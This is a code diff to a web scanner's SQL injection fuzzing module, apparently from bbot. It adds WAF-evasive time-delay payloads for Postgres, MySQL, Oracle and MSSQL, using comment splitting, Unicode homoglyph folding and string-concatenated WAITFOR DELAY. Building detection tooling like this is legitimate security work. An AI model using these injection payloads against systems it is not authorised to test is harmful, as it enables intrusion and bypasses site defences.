@@ -1,3 +1,5 @@
+import urllib.parse
+
 from .base import BaseLightfuzz
 from bbot.errors import HttpCompareError
 
@@ -41,16 +43,29 @@ class sqli(BaseLightfuzz):
         "string not properly terminated",
     ]
 
+    # WAF-evasive time-delay payloads, with each original injection context retained:
+    #   * Postgres uses pg_sleep_for(interval); IS NULL forces evaluation instead of
+    #     allowing the planner to discard the function from an EXISTS target list.
+    #   * MySQL accepts a # comment between SLEEP and its arguments. Bitwise XOR
+    #     forces function evaluation instead of allowing boolean short-circuiting.
+    #   * Oracle folds the Unicode identifier characters below to DBMS_PIPE and
+    #     RECEIVE_MESSAGE while preserving the blocking function call.
+    #   * MSSQL assembles WAITFOR DELAY from string constants passed to EXECUTE.
     DELAY_PROBE_TEMPLATES = [
-        "'||pg_sleep({d})--",
-        "' OR (SELECT TRUE FROM pg_sleep({d})) LIMIT 1-- -",
-        "1' AND (SLEEP({d})) AND '",
-        "' OR SLEEP({d}) IS NOT NULL LIMIT 1-- -",
-        " OR SLEEP({d}) IS NOT NULL LIMIT 1-- -",
-        "' AND (SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP({d})=0) AND '1'='1",
-        "'; WAITFOR DELAY '00:00:{d:02d}'--",
-        "; WAITFOR DELAY '00:00:{d:02d}'--",
+        "'||pg_sleep_for('{d} seconds'::interval)--",
+        "'OR(pg_sleep_for('{d} seconds'::interval)IS NULL)--",
+        "1'^SLEEP#q\n({d})^'0",
+        "'^SLEEP#q\n({d})^'0",
+        "^SLEEP#q\n({d})#",
+        "'||DBMſ_PıPE.RECEıVE_MEſſAGE('a',{d})||'",
+        "';EXECUTE--q\n('W'+'A'+'I'+'T'+'F'+'O'+'R'+' '+'D'+'E'+'L'+'A'+'Y'+' '+'''00:00:{d:02d}''')--",
+        ";EXECUTE--q\n('W'+'A'+'I'+'T'+'F'+'O'+'R'+' '+'D'+'E'+'L'+'A'+'Y'+' '+'''00:00:{d:02d}''')--",
     ]
+
+    def _delay_probe_value(self, event_type, value):
+        if event_type == "GETPARAM" and not getattr(self.event, "envelopes", None):
+            return urllib.parse.quote(value.encode(), safe="")
+        return value
 
     async def _confirm_code_change(self, probe_value, cookies, initial_status_codes, rounds=2):
         """Run additional confirmation rounds with fresh baselines to rule out transient server/CDN flaps.
@@ -229,10 +244,11 @@ class sqli(BaseLightfuzz):
                 stage1_failed = False
                 for _ in range(self.delay_stage1_reps):
                     payload_low = template.format(d=self.delay_low)
+                    probe_low = self._delay_probe_value(self.event.data["type"], f"{probe_value}{payload_low}")
                     r = await self.standard_probe(
                         self.event.data["type"],
                         cookies,
-                        f"{probe_value}{payload_low}",
+                        probe_low,
                         additional_params_populate_empty=True,
                         timeout=20,
                     )
@@ -269,10 +285,11 @@ class sqli(BaseLightfuzz):
                 stage2_failed = False
                 for _ in range(self.delay_stage2_reps):
                     payload_high = template.format(d=self.delay_high)
+                    probe_high = self._delay_probe_value(self.event.data["type"], f"{probe_value}{payload_high}")
                     r = await self.standard_probe(
                         self.event.data["type"],
                         cookies,
-                        f"{probe_value}{payload_high}",
+                        probe_high,
                         additional_params_populate_empty=True,
                         timeout=30,
                     )
